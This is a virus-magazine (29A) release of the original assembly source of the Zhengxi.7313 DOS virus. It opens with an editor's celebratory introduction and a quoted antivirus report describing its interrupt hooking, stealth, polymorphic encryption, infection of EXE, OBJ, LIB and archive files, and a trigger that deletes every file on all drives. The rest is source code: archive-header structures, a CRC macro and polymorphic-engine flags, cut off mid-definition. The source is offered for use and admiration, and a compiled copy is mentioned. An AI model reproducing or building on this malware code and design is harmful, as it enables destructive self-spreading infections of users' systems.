;                      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;                      ³     Zhengxi.7313     ³Û
;                      ³ original source code ³Û
;                      ÀÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÛ
;
;
; At last... the source of  the most complex virus  ever is  published in a
; virus magazine. And we're glad  that the fortunate magazine is 29A :) You
; are stepping  with the reader cool  smooth  scroll through  the  original
; source code of the best of the three versions (7271, 7307, 7313) of Zhen-
; gxi. This source code, as the compiled  version  of the  virus itself, is
; quite hard to understand. Anyway, i decided  to leave the source code 'as
; is', albeit some  weeks ago i started making it up  a bit and  commenting
; some uncommented code so it would be more easy and clear to read. At last
; i decided to stop spending my  time on this and give you the *truly* ori-
; ginal source code, so  you can know the way in which its author coded it,
; you can read the original comments (some  of them in russian), and so on.
;
; The original source code is formed  by some ASI, ASM and INC files, which
; make  the virus  compiling  harder than the virus coding itself :) That's
; why i included a ZIP which contains the compiled version of Zhengxi.7313.
;
; I must give thanks to the author of this rocking virus because of the su-
; permarvel he coded and  for releasing the  original  source code (btw, he
; seems to have a great sense of humour :), and to the friend who gave this
; jewel to me, who  wishes to remain anonymous. As a last  thing, for those
; who still don't know  what does Zhengxi do (!), here's a very good report
; about  the  Zhengxi  virus family, written by Eugene Kaspersky, who, btw,
; should use the money he earns with AVP for taking some english classes :)
;
;
; ÄÄ´ Zhengxi family ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;
; This is the  family of very dangerous, polymorphic  and stealth parasitic
; viruses. These  viruses  are more  that 7k of length, very complex, maybe
; the  most complex DOS viruses. These  viruses infect EXE, OBJ and LIB fi-
; les, and append COM droppers to ZIP, ARJ, HA, and RAR archives. The viru-
; ses contain the text strings:
;                                             
;   Abnormal program termination                                   
;   The Virus/DOS 0.54  Copyright (c) 1995 Zhengxi Ltd            
;   Warning! This program for internal use only!                  
;                                                                  
;
; Installation                                                
; ÄÄÄÄÄÄÄÄÄÄÄÄ                                                  
; The virus code  receives  the  control from different points depending on
; the infection way, but in all cases  the  destination is  the polymorphic
; decryption  routine. In EXE files (appending) the  decryption routine re-
; ceives  the control immediately when EXE  file is loaded  into the memory
; for execution; in EXE  files (inserting), from the  loader  code (see EXE
; infection); in the files linked  with infected OBJ/LIB files, from a call
; instruction (see OBJ/LIB infection); the COM droppers have a jmp instruc-
; tion at  their beginning, which brings the control to the decryption rou-
; tine.     
;                                                                             
; Being decrypted, the  virus installation  routines receives  the control.
; The virus  hooks int 1 (one step tracing), and traces int 21h. While tra-
; cing, the virus looks for  some specific code  within the int 21h handler
; (that code is present in DOS 5.x and DOS 6.x). If such code is found, the
; virus checks several conditions, and terminates installation  in some ca-
; ses. These cases are the ones below:                            
;                                                                  
; - Microsoft Windows is installed                               
; - Boot drive is A: or B:                                      
; - Int 8, 13h, 28h point to the same  segment (to exit installation if any
;   antivirus monitor is installed?)                             
; - Host file's  day (date and time stamp) is the same or near  the current
;   day (if the two highest  bits of current day number xored with the file
;   day is equal to zero)                                        
;                                                                             
; Then the virus allocates the block of the system memory for the virus TSR
; copy, stores in its body 11 bytes from the address of the int 21h handler
; and patches int 21h  code with  a far  call instruction (2f ff 1e ?? ??),
; which  brings the  control  to the  int 25h handler (absolute disk read).
; Then the  virus stores the first five bytes of int 25h handler and writes
; there other five bytes, which become the  far jmp to the  virus code. The
; result looks like follows:                        
;                                                                
;      int 21h handler:
;              ...              ...
;   ÚÄÄÄÄÄÄÄÄÄ 2e ff 1f ????    call far cs:int_25h
;   ³          c7 06            ????                 ; Magic word?
;   ³ int_25h: ???? ????        ???? ????            ; Far addr of int 25h
;   ³          ...              ...
;   ³
;   À> int 25h handler:
;   ÚÄÄÄÄÄÄÄÄÄ ea ???? ????     jmp far virus_handler
;   ³          ...              ...
;   À> virus handler:
;              2e 8f 06 ...     pop cs:caller_ip
;              ...              ...
;                                                               
; As result, the  virus has the  same handler to intercept both int 21h and
; int 25h calls. To separate these calls, Zhengxi checks the address of the
; caller (the caller_ip). If the call  goes to the int 21h handler, the vi-
; rus passes the  control to its int 21h handler routine; in  another case,
; the virus int 25h handler receives the control.         
;                                                                 
; The installation routine is complete, but the virus can move  its code to
; other memory  blocks (see int 21h  handler analysis). So, the TSR copy of
; the virus  does not occupy the  same blocks of the system memory, but may
; move itself to other addresses, including UMB ones.              
;                                                                 
; Then the virus returns the  control to the host program. There  are three
; different  variants  of such return, and they depend on the infection me-
; thod. In case of a COM dropper the virus just displays this message:  
;                                                                  
;  Abnormal program termination                            
;                                                       
; And returns to DOS with the terminate function (int 21h, ah=4ch). In case
; of the EXE-appending infection method the virus restores the original fi-
; le header by using its  polymorphic engine (generates the polymorphic de-
; cryption routine, and executes  it for restoring the original header (see
; EXE infection below). In case of the EXE-inserting way the virus just re-
; turns to the host program because the virus loader inserted into the file
; restores the original  code itself. In  case of being an OBJ/LIB file the
; virus also just returns to the host (see OBJ/LIB infection below).
;                                                             
;
; Int 21h handler                                      
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                                        
; Zhengxi intercepts 18 int 21h functions:
;
;   3dh, 6ch      - Open/create file
;   3eh           - Close file
;   3fh           - Read file
;   42h           - Lseek
;   4bh           - File execution
;   41h           - Delete file
;   11h, 12h      - Findfirst/findnext FCB
;   4eh, 4fh      - Findfirst/findnext ASCII
;   00h, 4ch      - Terminate
;   31h           - Terminate and stay resident
;   67h           - Set handle count
;   48h, 49h, 4ah - Memory managing functions (allocate, free, resize)
;                                                     
; The set handle count, file execution and memory managing functions are u-
; sed by the virus to hide its code into the system memory (Zhengxi manipu-
; lates MCB blocks to remain invisible on the memory map while using memory
; browsing utilities).
;                                                           
; While intercepting terminate, TSR and free  memory DOS functions, Zhengxi
; moves its code to a new address in the system memory. The virus allocates
; a  new memory block (may be  a conventional or UMB memory block), and co-
; pies itself there. So, while installing, the  virus  does not  affect UMB
; blocks to place its TSR copy, but then it may move into UMB, and hide it-
; self there.                                         
;                                                           
; While file opening the virus performs several different calls. First, the
; virus checks the opening mode, and if the file is opened for writing, the
; virus disinfects the file.                                   
;                                                             
; Before disinfection the virus  checks the file is being accessed, and the
; program  that is accessing that file (the caller). The virus compares the
; name of this program or caller with a name list (see below), and does not
; disinfect the accessed file if the caller name is found in that list.
;                                                        
;   UUENCODE.EXE, PKLITE.EXE, LZEXE.EXE, NDD.EXE, DIET.EXE, AFD.EXE, SD.EXE
;   SPEEDDSK.EXE, DEFRAG.EXE, TLINK.EXE, LINK.EXE
;                                                       
; In case of the ah=3d00h function (open read-only) the virus performs some
; strange actions. It scans  the caller code  and patches it. It looks like
; patching  some antivirus scanner. Fortunately, the  virus  has a bug, and
; that branch is never executed.                     
;                                               
; While opening the file, the virus also  brings the control to its stealth
; routine: it replaces the file length with the original one.   
;                                                           
; While reading  from a file, Zhengxi calls the stealth routine. In case of
; reading  from the header of the  infected file  the virus reads, decrypts
; and copies the original header into the reading buffer. 
;                                                        
; In case  of the lseek function the virus brings the  control  to other of
; its stealth routines: it doesn't allow to seek out of  the  original file
; length.                                              
;                                                         
; While deleting an infected file, the virus disinfects it.    
;                                                                             
; While looking for files with findfirst/findnext, Zhengxi replaces the fi-
; le length with the original one if the file is infected.
; 
; Findfirst/findnext ASCII calls are also  used by the virus to catch files
; for infection. The virus saves the name of any file that is accessed with
; the findfirst function, and approximately each 5th file (with probability
; 3/16) accessed  with the findnext function. The virus has only one buffer
; for the file name, so every next name overwrites the previous one.
;                                                              
; While closing any file the virus checks and infects it with the name that
; that is stored in the buffer. The virus also infects the file that is be-
; ing closed, but  is  does  it with probability 1/4 (by the result  of its
; random generator).
;                                                    
;                                                      
; Infection                                         
; ÄÄÄÄÄÄÄÄÄ                                          
; Before infecting a file, Zhengxi checks several conditions:   
;                                                      
; - The file  is  not "just created", by comparing the  current  day number
;   with the file date and time stamp (as while installing itself)  
; - The file is local, and not on A: or B: drive        
; - The file name is not *.?V? (*.OVL)                 
; - There is enough free disk space (it checks this with int 21h, ah=36h)
;                                                               
; If all this is ok, the virus reads the file header and checks it for EXE,
; OBJ, LIB and archives stamps.                              
;                                                           
;
; Infecting EXE files                                  
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                                 
; Zhengxi infects EXE files  by using three  different  infection  methods:
; appending, inserting, and infecting archives in self-extracting files.
;                                                             
; At first, the  virus checks  the file  structure, and if it is a self-ex-
; tracting EXE file (created by ZIP2EXE, for  instance), Zhengxi infects it
; using the same method it uses when infecting archives (ZIP, ARJ, HA, RAR)
; that is, creating a COM dropper and adding it to the archive contents.
;
; Then the virus  checks the  file length, and doesn't infect files  with a
; length lesser than 400h (1024) bytes. If the length of the loadable modu-
; dule (note: not the file length) is larger that 32k, Zhengxi  inserts its
; own loader int the middle of the file. In other case, it infects the file
; by the appending method.                               
;                                                    
; While infecting files by the appending method, Zhengxi reads file header,
; encrypts  and saves it to the end  of the file. Then it runs its polymor-
; phic  generator, and saves the encrypted  virus body and  the polymorphic
; loops to  the end of the file. For finishing  the file infection, Zhengxi
; increases the file length  to a value  that divided  by 9dh  gives 25h as
; rest (this  is the virus ID stamp, its infection  mark), and modifies the
; EXE header fields (registers and module length). 
;                                                                             
; Note: Zhengxi encrypts the original  host header with the polymorphic en-
; cryption  loop, and that loop  is different  that the routine it uses for
; encrypting the virus body. Then, the  virus calls its polymorphic  engine
; twice: while encrypting the original EXE header, and while encrypting the
; main body.                                
;                                                 
; While executing an  infected EXE file, the  decryption  loop restores the
; main virus body, but not original file header. To return to the host, the
; virus has to decrypt the host data, but the engine generates random loops
; with random selected encryption functions. To solve that problem, Zhengxi
; stores  the initial random generator values while encrypting the host da-
; ta, and runs the polymorphic generator with the same values while decryp-
; ting those data. As result, the generator brings  the same code which was
; used for encrypting the host header, and being executed, that routine de-
; crypts it.                     
;                                                       
;
; Infecting EXE Files (inserting)                    
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                    
; If the file length is above 32k, the virus  seeks to the beginning of the
; EXE main module (just after EXE header), reads 6k of code, and  looks for
; C/Pascal  routines  there. Usually C/Pascal  routines begin from the same
; "header" that saves the BP register, and moves the stack pointer to BP.
;                                                    
; Zhengxi scans the  code for  those "headers" and, if  such code is found,
; the virus  scans the next 54h bytes of  code for a ret or a call far ins-
; truction to  prevent an overlap  of the next subroutine, or relocated ad-
; dress. If such  code (ret or call far) is found, the virus exits from its
; infection routine.              
;                                                      
; Then the virus  reads 54h bytes of  that routine, overwrites  it with the
; code of its loader, and then  encrypts the main virus body with its poly-
; morphic engine, and saves  it to  the end of  the  file. Then Zhengxi en-
; crypts with  a simple  sub function the original subroutine code  and the
; second part of the loader, and  saves it to the end of the file. Then the
; virus writes the random data to the end  of the file  in the  same way as
; in the "appending" infection method.     
;
;    Not infected         Infected
;    ÄÄÄÄÄÄÄÄÄÄÄÄ         ÄÄÄÄÄÄÄÄ
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;   ³EXE header    ³     ³EXE header    ³
;   ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´     ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;   ³Main EXE code ³     ³Main EXE code ³
;   Ã--------------´     Ã--------------´
;   ³C/Pascal subr ÃÄÄ¿  ³Virus loader  ³ Part 1, 52h bytes, not encrypted
;   Ã--------------´  ³  Ã--------------´
;   ³              ³  ³  ³Main EXE code ³
;   ³              ³  ³  ³(continued)   ³
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ  ³  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;                     ³  ³Virus         ³ Encrypted with polymorphic loops
;                     ³  Ã--------------´
;                     ³  ³Virus loader  ³ Part 2, encrypted with sub
;                     ³  Ã--------------´ 70h bytes
;                     ÀÄ>³Saved code    ³ Original code of the patched subr,
;                        Ã--------------´ 52h bytes, encrypted with sub
;                        ³Random data   ³ File length/9dh, the rest is 25h
;                        ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
; Being executed, the loader looks  for the host file name by using the PSP
; fields, opens the file, seeks  to the file end, then  reads, decrypts and
; executes the second  part of the dropper. This part restores the  patched
; subroutine, allocates system memory (conventional or UMB), reads the main 
; virus body, and  passes  the control to  the decryption polymorphic loop.
; That loop  decrypts the virus body, and passes  the control  to Zhengxi's 
; installation routine.
;                                                      
; This is a very  insidious infection  way. The virus code is hidden in the
; file, and there is no  direct entry to the virus code from the file head-
; er. The subroutine replaced with  virus loader may be a "seldom-executed"
; one. For  instance, a subroutine which displays  an error message. So the
; virus may "sleep" in such  files for a long  time, and then jump  out and      
; infect the system under some limited conditions.      
;                                                 
;
; Infecting archives                  
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; In case of having to infect  an archive, Zhengxi builds in memory the in-
; fected COM dropper image, and appends it to  the archive. Those COM drop-
; pers always begin with a jmp instruction followed by random data, the en-
; crypted virus  code and the decryption polymorphic loop. The jmp instruc-
; tion brings the control to this decryption loop.
;                                              
; The name of the COM dropper is random  selected and  finished with a .COM
; extension, for instance:                 
;                                      
;   HAIF.COM, UCM.COM, DOO.COM, VLG.COM, and so on.   
;                                           
; While processing the archive fields, Zhengxi does not use any external u-
; tility, but fills by itself all  the necessary fields. The virus does not
; pack the dropper: it uses the "stored" method (the virus is stored in the
; archive "as is"). While infecting, Zhengxi checks the contents of the ar-
; chives, and does not infect them twice.       
;                                             
;                                        
; Infecting OBJ and LIB files                        
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                             
; While infecting OBJ/LIB modules, Zhengxi checks  the fields  of the file,
; creates, and  inserts there  a new object record which contains the viral
; code, encrypted with two polymorphic loops.    
;                                         
; While scanning object files, the virus checks the code of these files for
; a C/Pascal subroutine "header" as well as while inserting into EXE files,
; and infects the  files only if that code is  found. But if the OBJ or the
; LIB module doesn't contain such code, the virus  does not drop the loader
; code there, but overwrites a C/Pascal header with a call instruction.
;                              
; Being linked  to an executable  file, that call brings the control to the
; virus polymorphic decryption loop. That loop decrypts the viral  code and
; passes the control to the virus installation routine.
;                   
; As well as in EXE files (inserting), that call may never receive the con-
; trol, so Zhengxi may sleep for a long time. But under some conditions the 
; virus may jump out and infect the system.
;                          
;                     
; Int 25h handler 
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ          
; This handler  carries out the stealth routine on int 25h level. While ac-
; cessing  to the directory entries, the virus substitutes the  file length
; with the original  one. While reading the header of an infected file, the
; virus restores and brings it in its original form.
;                            
; The virus doesn't stealth 100% on int 25h level, of course. There are se-
; veral ways to bypass  this stealth routine. But if some antivirus program
; reads the file contents  via int 21h DOS functions, then it reads the di-
; rectory structure  and then the file contents  by absolute int 25h calls,
; and Zhengxi remains completely invisible.
;          
;                         
; Trigger routine  
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ                                     
; If while processing a ZIP file Zhengxi finds  some record packed with the
; "stored" method, it checks the ZIP file  date and time stamp. If the year
; of last modification of that file is 1996 or above, Zhengxi will look for
; all the files  of all the directories on all the disks (from C: till Z:),
; and delete them (the files and whole subdirectory tree).
;
; ÄÄ´ Zhengxi code ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

; Structure of archive block (low order byte first):
arj_hdr_struc struc
arj_header_id           dw   ?   ; 0;=EA60  2  header id (comment and local
                                 ; file) = 0xEA60 or 60000U
arj_bas_hdr_size        dw   ?   ; 2;=28 ?  2  basic header size (from
                                 ; 'first_hdr_size' thru 'comment' below)
                                 ;= first_hdr_size + strlen(filename) + 1
                                 ;+ strlen(comment) + 1
                                 ;= 0 if end of archive
arj_first_hdr_size      db   ?   ; 4;1E  1  first_hdr_size (up to extra data)
arj_ver_num             db   ?   ; 5;06  1  archiver version number
arj_min_ver             db   ?   ; 6;01  1  min. archiver version to xtract
arj_host_OS             db   ?   ; 7;00  1  host OS (0 = MSDOS, 1 = PRIMOS, 
                                 ; 2 = UNIX, 3 = AMIGA, 4 = MACDOS)
arj_flags               db   ?   ; 8;10  1  arj flags (0x01 = GARBLED_FLAG)
                                 ; indicates passworded file
                             ;   ; (0x02 = RESERVED)
                             ;   ; v- no inf.vol.files, detect it as already
                             ;   ; (0x04 = VOLUME_FLAG)  indicates continued
                                 ; file to next volume
                             ;   ; (0x08 = EXTFILE_FLAG) indicates file
                                 ; starting position field
                             ;   ; (0x10 = PATHSYM_FLAG) path translated
arj_compres_method      db   ?   ; 9;00  1  method (0 = stored, 1 = compressed
                                 ; most ... 4 compressed fastest)
arj_file_type           db   ?   ; A;00  1  file type (0 = binary, 1 = text
                                 ; 2 = comment header)
arj_reserved            db   ?   ; B;'Z' 1  reserved
arj_file_time           dw   ?   ; C;    4  date time stamp modified
arj_file_date           dw   ?   ; E;    4  date time stamp modified

arj_compressed_size     dd   ?   ;10;    4  compressed size
arj_original_size       dd   ?   ;14;    4  original size
arj_CRC32               dd   ?   ;18;    4  original file's CRC
arj_entryname_pos       dw   ?   ;1C;0   2  entryname position in filename
arj_file_access_mode    dw   ?   ;1E;0   2  file access mode
arj_host_data           dw   ?   ;20;0   2  host data (currently not used)
                                 ;22;
; ?  filename (null-terminated)
; ?  comment  (null-terminated)
; 4  basic header CRC
; 2  1st extended header size (0 if none) = 0

; ?  compressed file
ends

ha_main struc
    hasign  db 'HA'
    filecnt dw ?
ends

ha_file_hdr struc
    ha_ver_method       db  20h                     ; 0
    ha_compress_size    dd  ?                       ; 2
    ha_original_size    dd  ?                       ; 6
    ha_CRC32            dd  ?                       ; A
    ha_file_time        dw  ?                       ; E
    ha_file_date        dw  ?                       ; 10
    ha_path             dw ? ; '/', '.', '+'        ; 12 db
ends                                                ; 14
    ha_name equ ha_path+size ha_path
;+1      name
;+n      00h
;+1      length of machine specific information
;+1      machine specific information
;2,1,20

;machine specific information :

;0000    type
;0001    information

rar_main_hdr struc
    rar_head_crc       dw   ?
    rar_head_type      db   73h
    rar_head_flags     dw   ?
;                0x01    - Volume attribute (archive volume)
;                0x02    - Archive comment present
;                0x04    - Archive lock attribute
;                0x08    - Solid attribute (solid archive)
;                0x10    - Unused
;                0x20    - Authenticity information present
    rar_head_size      dw   ?
    rar_reserved1      dw   ?
    rar_reserved2      dd   ?
ends
;Comment block   present if (HEAD_FLAGS & 0x02) != 0

rar_file_hdr struc
    rar_f_head_crc       dw   ?             ; 0
    rar_f_head_type      db   74h           ; 2
    rar_f_head_flags     dw   ?             ; 3
;                0x01 - file continued from previous volume
;                0x02 - file continued in next volume
;                0x04 - file encrypted with password
;                0x08 - file comment present
;               (HEAD_FLAGS & 0x8000) == 1, because full
;               block size is HEAD_SIZE + PACK_SIZE
    rar_f_head_size      dw   ?              ; 5
    rar_compressed_size  dd   ?              ; 7
    rar_original_size    dd   ?              ; B
    rar_host_os          db   0              ; F
    rar_crc32            dd   ?              ;10
    rar_file_time        dw   ?              ;14
    rar_file_date        dw   ?              ;16
    rar_req_ver          db   15d            ;18
    rar_method           db   30h            ;19
    rar_fname_size       dw   ?              ;1A
    rar_file_attrib      dd   ?              ;1C
ends                                         ;20
;FILE_NAME       File name - string of NAME_LEN bytes size
;Comment block   present if (HEAD_FLAGS & 0x08) != 0
;????            Other extra included blocks - reserved for future use



zip_local_header struc
       zip_loc_sign                         db     'PK'   ;  0
       zip_ver_ned_to_extr                  dw     ?        ;  4

       zip_flags                            dw     ?        ;  6
       zip_compression_method               dw     ?        ;  8
       zip_file_time                        dw     ?        ;  A
       zip_file_date                        dw     ?        ;  C

       zip_crc_32                           dd     ?        ;  E
       zip_compressed_size                  dd     ?        ; 12
       zip_uncompressed_size                dd     ?        ; 16
       zip_size_fname                       dw     ?        ; 1A
       zip_extra_field_length               dw     ?        ; 1C
ends                                                    ; 1E
;        filename (variable size)
;        extra field (variable size)
zip_central_header struc
       zip_centr_sign_                      db     'PK'   ;  0
       zip_ver_made_by_                     dw     ?        ;  4
       zip_ver_ned_to_extr_                 dw     ?        ;  6
       zip_flags_                           dw     ?        ;  8
       zip_compression_method_              dw     ?        ;  A
       zip_file_time_                       dw     ?        ;  C
       zip_file_date_                       dw     ?        ;  E
       zip_crc_32_                          dd     ?        ; 10
       zip_compressed_size_                 dd     ?        ; 14
       zip_uncompressed_size_               dd     ?        ; 18
       zip_size_fname_                      dw     ?        ; 1C
       zip_extra_field_length_              dw     ?        ; 1E
       zip_file_comment_length_             dw     ?        ; 20
       zip_disk_number_start_               dw     ?        ; 22
       zip_intrnl_file_attr_                dw     ?        ; 24
       zip_extrnl_file_attr_                dd     ?        ; 26
       zip_rel_off_of_loc_hdr_              dd     ?        ; 2A
ends                                                    ; 2E
;        filename (variable size)
;        extra field (variable size)
;        file comment (variable size)

zip_end_header struc
       end_file_hdr_sign                db     'PK'   ;  0
       num_of_this_disk                 dw     ?        ;  4
       num_of_the_start_disk            dw     ?        ;  6
       ttl_num_of_ent_on_this_disk      dw     ?        ;  8
       ttl_num_of_ent_in_the_cent_dir   dw     ?        ;  A
       size_of_the_central_directory    dd     ?        ;  C
       off_of_strt_of_cent_directory    dd     ?        ; 10
       zipfile_comment_length           dw     ?        ; 14
ends                                                    ; 16
;            zipfile comment (variable size)


seg_attr RECORD SA_A:3, SA_C:3, SA_B:1, SA_P:1

MODEND  = 08Ah
SEGDEF  = 098h
FIXUPP  = 09Ch
LEDATA  = 0A0h
;extrn dosseek_cx_0:near
objrec struc
rectype db ?
recsize dw ?
    UNION
    STRUC
        segattr db ?
        segsize dw ?
    ENDS
    STRUC
        dataidx db ?
        dataorg dw ?
    ENDS
    ENDS
ENDS


LIB_DICTIONARY_ENTRY_SIZE = 200h
lib_hdr struc
    lib_hdr_type            db      0F0h
    lib_hdr_recsize         dw      ?
    lib_hdr_dict_offs       dd      ?
    lib_hdr_dict_size       dw      ?
    lib_hdr_flags           db      ?
    lib_hdr_padding         db      10h-lib_hdr_padding dup (?)
ends

;;MRORW MACRO w1, shval
;;PUSHSTATE
;;.386
;;        dw ((w1 and 0FFFFh) shr (shval and 0Fh)) or ((w1 and 0FFFFh) shl
;;           (10h-(shval and 0Fh)))
;;POPSTATE
;;ENDM


CRC32w MACRO moreshit
PUSHSTATE
.386
LOCAL cum_crc, byt, suxx
    cum_crc = 0FFFFFFFFh
    IRP _byt, <moreshit>
        byt = _byt xor (cum_crc and 0FFh)
        cum_crc = (cum_crc shr 8) and 0FFFFFFh
        REPT 8
            IF byt and 1
                byt = (byt shr 1) xor 0EDB88320H
            ELSE
                byt = byt shr 1
            ENDIF
        ENDM
        cum_crc = cum_crc xor byt
    ENDM
    cum_crc = not cum_crc

    suxx =  (((cum_crc shr 16) and 0FFFFh) shr (cum_crc and 0Fh)) or \
        (((cum_crc shr 16) and 0FFFFh) shl (10h-(cum_crc and 0Fh)))

    suxx = (suxx + cum_crc) and 0FFFFh ; add dx, cx
    dw suxx
POPSTATE
ENDM

cmp_ax_CRC32w MACRO moreshit
    db 3Dh
    CRC32w <moreshit>
ENDM

.286
%NOINCL
%NOSYMS
.SFCOND
.XCREF
.SALL

locals
USE_PUSHA equ 0
;RELIZ equ 0
;USE_BEEP equ 0

$BEEP$ macro
IFDEF USE_BEEP
extrn beep:near
call beep
ENDIF
endm
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
INCLUDE SF.INC      ;\
INCLUDE FIND.INC    ;|
INCLUDE EXE.INC     ;> ¨§ ¨áå®¤­¨ª®¢ MS-DOS 3.30
INCLUDE PDB.INC     ;|
INCLUDE DPB.INC     ;|
INCLUDE DIRENT.INC  ;|
INCLUDE ARENA.INC   ;/
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
INCLUDE STAR14T.INC
INCLUDE ABSDISK.INC
INCLUDE ARXHDRS.ASI
INCLUDE SHMAC.INC
INCLUDE CRC.ASI
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
GLOBAL      RND_INIT:near,                  \
            RND_GET:near,                   \ randomizer
            RND_GET_THREE_BITS:near,        \
            RND_GET_BYTE:near
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
RegWord         ENUM    R_AX, R_CX, R_DX, R_BX, R_SP, R_BP, R_SI, R_DI
RegByte         ENUM    R_AL, R_CL, R_DL, R_BL, R_AH, R_CH, R_DH, R_BH

secondbyte      RECORD  M0D:2, REG:3, R_M:3

asgrbl  RECORD  N               :1,     \
                REG_GARBL3      :1,     \ à¥£¨áâàë
                REG_GARBL2      :1,     \ ­¥ ¨á¯®«ì§ã¥¬ë¥
                REG_GARBL1      :1,     \ ¤«ï à áè¨äà®¢ª¨
                REG_TMP2        :1,     \   ¤«ï ª®­áâ ­â
                REG_TMP1        :1,     \
                REG_ENC         :1,     \
                REG_INDEX       :1      ; ãª § â¥«ì ­  è¨äàã¥¬®¥ á«®¢®

REG_GARBL_ALL = MASK REG_GARBL1   or    \ à¥£¨áâàë
                MASK REG_GARBL2   or    \   ­¥ ¨á¯®«ì§ã¥¬ë¥
                MASK REG_GARBL3         ;     ¤«ï à áè¨äà®¢ª¨
REG_ENC_ALL   = MASK REG_ENC      or    \ à¥£¨áâàë
                MASK REG_TMP1     or    \   ¨á¯®«ì§ã¥¬ë¥
                MASK REG_TMP2           ;     ¤«ï à áè¨äà®¢ª¨
REG_ALL       = MASK REG_INDEX    or    \ ¢á¥ à¥£¨áâàë (ªà®¬¥ SP)
                REG_ENC_ALL       or    \
                REG_GARBL_ALL           ;
;ÄcurrentÄnotÄusedÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ENFLAGS RECORD  EN_SAVE_REGS    :1,     \ á®åà ­ïâì à¥£¨áâàë ¯¥à¥¤ à áè¨äà®¢ª®©
                EN_USE_INT      :1,     \ ¥­ª®¤¨âì ¯à¥àë¢ ­¨ï
                EN_USE_CALL     :1,     \ ¥­ª®¤¨âì ¯à®æ¥¤ãàë ¨ JMP near
                EN_USE_JMPS     :1,     \ ¥­ª®¤¨âì ãá«®¢­ë¥ ¯¥à¥å®¤ë
                EN_INT_GARBL    :1,     \ ¬ «® «¥¢ëå ¨­áâàãªæ¨© ¢ à áè¨äà®¢é¨ª¥
                EN_RELOCATOR    :1,     \ ®¯à¥¤¥«ïâì á¢®¥ ¯®«®¦¥­¨¥ ¢ ¯ ¬ïâ¨
                EN_BFR_GARBL    :2
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

ENFLAGS_ARX =   MASK EN_RELOCATOR   or  \
                MASK EN_USE_INT     or  \
                MASK EN_USE_JMPS    or  \
                MASK EN_USE_CALL    or  \
                (3 shl  EN_BFR_GARBL)   ;

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ä« £¨ ¤«ï ¢¨àãá  ¢ EXEä ©«¥
ENFLAGS_EXE =   MASK EN_USE_INT     or  \
                MASK EN_USE_JMPS    or  \
                MASK EN_USE_CALL    or  \
                (3 shl  EN_BFR_GARBL)   ;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ENFLAGS_HDR =   MASK EN_INT_GARBL   or  \
